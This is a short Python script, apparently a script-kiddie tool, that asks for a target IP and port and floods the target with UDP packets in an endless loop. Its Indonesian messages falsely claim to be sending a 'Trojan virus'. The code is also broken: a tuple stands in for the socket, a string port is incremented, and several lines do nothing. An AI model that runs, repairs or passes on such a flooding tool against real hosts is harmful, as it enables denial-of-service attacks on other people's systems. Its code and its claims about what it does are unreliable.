#Author WHITE L'
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = (socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(666)
bytes = random._urandom(666)
bytes = random._urandom(666)

os.system("clear")
ip = input("[+] Target's IP : ")
port = input("[+] Target's port : ")
sent = input("[+] input Sent Packet : ")
random = input("[+] Input random tools : ")
ping = input("[+] input ping tools : ")
os.system("clear")
print("Menyiapkan Virus Trojan   500k")
time.sleep(3)
print("Mengirim Virus Trojan 500k")
time.sleep(3)
print("Dalam Waktu 1menit")
while True:
    sent = 0
    for bytes in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        sent == 65534
        port = port + 1
        port == 65534
        ping = sent + 1
        ping == 65534
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
